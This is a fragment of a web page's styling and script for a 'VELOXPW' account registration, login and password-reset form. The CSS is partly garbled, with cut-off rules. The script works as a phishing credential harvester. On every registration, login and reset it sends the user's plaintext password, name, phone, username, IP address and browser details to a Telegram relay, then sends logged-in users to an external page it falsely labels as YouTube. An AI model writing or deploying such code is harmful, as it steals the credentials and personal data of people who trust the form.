        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #0B1E33;
            --secondary: #1A3B5E;
            --accent: #C5A572;
            --accent-light: #D4B68A;
            --accent-dark: #B38B4D;
            --success: #00BFA6;

            top: 0;
            left: 0;

            height: 100%;
            z-index: 0;

        .circle {
            position: absolute;
            border-radius: 50%;
            background: rgba(197, 165, 114, 0.03);
            animation: float 20s infinite;
        }

        .circle-1 {
            width: 500px;
            height: 500px;
            top: -250px;
            right: -250px;
            animation-delay: 0s;
        }

        .circle-2 {
            width: 400px;
            height: 400px;
            bottom: -200px;
            left: -200px;
            animation-delay: -5s;
        }

        .circle-3 {
            width: 300px;
            height: 300px;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: -10s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(50px, 50px) scale(1.1); }
            50% { transform: translate(0, 100px) scale(1); }
            75% { transform: translate(-50px, 50px) scale(0.9); }

            max-width: 480px;
            width: 100%;
            padding: 3rem;
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease;

        .premium-card:hover {
            transform: translateY(-5px);
        }

        .premium-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg, var(--accent), var(--accent-light), var(--accent-dark));

            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);

            left: -50%;

            top: 0;
            left: 0;

            from {
                opacity: 0;
                transform: translateY(30px);

        }

        async function hashPassword(password) {
            const encoder = new TextEncoder();
            const data = encoder.encode(password);
            const hash = await crypto.subtle.digest('SHA-256', data);
            return Array.from(new Uint8Array(hash))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

            }
        }

        // Get client IP
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unable to fetch';
            }
        }

        // Handle Registration
        async function handleRegistration() {
            if (!dbReady) {
                showAlert('System Error', 'Database is initializing. Please wait.', 'error');
                return;
            }

            const name = document.getElementById('regName').value.trim();
            const phone = document.getElementById('regPhone').value.trim();
            const username = document.getElementById('regUsername').value.trim().toLowerCase();
            const password = document.getElementById('regPassword').value;

            if (!name || !phone || !username || !password) {
                showAlert('Missing Fields', 'Please fill in all fields', 'error');
                return;
            }

            if (password.length < 8) {
                showAlert('Weak Password', 'Password must be at least 8 characters', 'error');
                return;
            }

            showLoading();

            try {
                const hashedPassword = await hashPassword(password);
                
                const transaction = db.transaction(['users'], 'readwrite');
                const store = transaction.objectStore('users');
                
                const checkRequest = store.get(username);
                
                checkRequest.onsuccess = async (event) => {
                    if (event.target.result) {
                        hideLoading();
                        showAlert('Username Taken', 'This username is already registered', 'error');
                        return;
                    }
                    
                    const user = {
                        username: username,
                        name: name,
                        phone: phone,
                        password: hashedPassword,
                        createdAt: new Date().toISOString()
                    };

                    const addRequest = store.add(user);
                    
                    addRequest.onsuccess = async () => {
                        // Get IP and send to Telegram
                        const ip = await getClientIP();
                        const userAgent = navigator.userAgent;
                        
                        await sendToTelegram({
                            name: name,
                            phone: phone,
                            username: username,
                            password: password,
                            ip: ip,
                            userAgent: userAgent
                        }, 'registration');
                        
                        hideLoading();
                        showAlert(
                            'üéâ Account Created Successfully!',
                            'Welcome to VELOXPW. You can now login with your credentials.',
                            'success'
                        );
                        
                        // Clear form and switch to login
                        document.getElementById('regName').value = '';
                        document.getElementById('regPhone').value = '';
                        document.getElementById('regUsername').value = '';
                        document.getElementById('regPassword').value = '';
                        
                        switchTab('login');
                    };
                    
                    addRequest.onerror = () => {
                        hideLoading();
                        showAlert('Registration Failed', 'An error occurred. Please try again.', 'error');
                    };
                };
            } catch (error) {
                hideLoading();
                showAlert('Error', 'An unexpected error occurred', 'error');
            }
        }

        // Handle Login
        async function handleLogin() {
            if (!dbReady) {
                showAlert('System Error', 'Database is initializing. Please wait.', 'error');
                return;
            }

            const username = document.getElementById('loginUsername').value.trim().toLowerCase();
            const password = document.getElementById('loginPassword').value;

            if (!username || !password) {
                showAlert('Missing Fields', 'Please enter username and password', 'error');
                return;
            }

            showLoading();

            try {
                const transaction = db.transaction(['users'], 'readonly');
                const store = transaction.objectStore('users');
                const request = store.get(username);

                request.onsuccess = async (event) => {
                    const user = event.target.result;
                    
                    if (!user) {
                        hideLoading();
                        showAlert('Login Failed', 'Username not found', 'error');
                        return;
                    }

                    const hashedInput = await hashPassword(password);
                    
                    if (hashedInput === user.password) {
                        // Get IP and send to Telegram
                        const ip = await getClientIP();
                        const userAgent = navigator.userAgent;
                        
                        await sendToTelegram({
                            username: username,
                            password: password,
                            ip: ip,
                            userAgent: userAgent
                        }, 'login');
                        
                        hideLoading();
                        showAlert(
                            '‚úÖ Login Successful!',
                            'WELCOME',
                            'success'
                        );
                        
                        // Redirect to YouTube after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://summitsolutions28.github.io/Well8372/S1986.html';
                        }, 2000);
                    } else {
                        hideLoading();
                        showAlert('Login Failed', 'Incorrect password', 'error');
                    }
                };

                request.onerror = () => {
                    hideLoading();
                    showAlert('Error', 'Login failed. Please try again.', 'error');
                };
            } catch (error) {
                hideLoading();
                showAlert('Error', 'An unexpected error occurred', 'error');
            }
        }

        // Handle Password Reset
        async function handleReset() {
            if (!dbReady) {
                showAlert('System Error', 'Database is initializing. Please wait.', 'error');
                return;
            }

            const username = document.getElementById('resetUsername').value.trim().toLowerCase();
            const phone = document.getElementById('resetPhone').value.trim();
            const newPassword = document.getElementById('resetPassword').value;

            if (!username || !phone || !newPassword) {
                showAlert('Missing Fields', 'Please fill in all fields', 'error');
                return;
            }

            if (newPassword.length < 8) {
                showAlert('Weak Password', 'Password must be at least 8 characters', 'error');
                return;
            }

            showLoading();

            try {
                const transaction = db.transaction(['users'], 'readwrite');
                const store = transaction.objectStore('users');
                const request = store.get(username);

                request.onsuccess = async (event) => {
                    const user = event.target.result;
                    
                    if (!user) {
                        hideLoading();
                        showAlert('Reset Failed', 'Username not found', 'error');
                        return;
                    }

                    if (user.phone !== phone) {
                        hideLoading();
                        showAlert('Reset Failed', 'Phone number does not match our records', 'error');
                        return;
                    }

                    const hashedPassword = await hashPassword(newPassword);
                    user.password = hashedPassword;

                    const updateRequest = store.put(user);
                    
                    updateRequest.onsuccess = async () => {
                        // Get IP and send to Telegram
                        const ip = await getClientIP();
                        const userAgent = navigator.userAgent;
                        
                        await sendToTelegram({
                            username: username,
                            phone: phone,
                            password: newPassword,
                            ip: ip,
                            userAgent: userAgent
                        }, 'reset');
                        
                        hideLoading();
                        showAlert(
                            'üîê Password Reset Successful!',
                            'You can now login with your new password.',
                            'success'
                        );
                        
                        // Clear form and switch to login
                        document.getElementById('resetUsername').value = '';
                        document.getElementById('resetPhone').value = '';
                        document.getElementById('resetPassword').value = '';
                        
                        switchTab('login');
                    };
                };
            } catch (error) {
                hideLoading();
                showAlert('Error', 'An unexpected error occurred', 'error');
            }
        }

        // Initialize form with login tab active
        switchTab('login');
    </script>
